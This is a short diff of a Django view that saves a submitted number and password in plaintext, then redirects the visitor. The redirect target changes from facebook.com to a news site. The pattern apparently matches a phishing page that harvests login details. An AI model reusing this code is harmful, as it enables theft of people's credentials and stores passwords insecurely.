@@ -16,6 +16,6 @@ def get_data(request):
         password = request.POST['password']
         app = models.app.objects.create(number=number, password=password)
         app.save()
-    return HttpResponseRedirect('Http://www.facebook.com')
+    return HttpResponseRedirect('Http://www.naijanews.com')
 
 
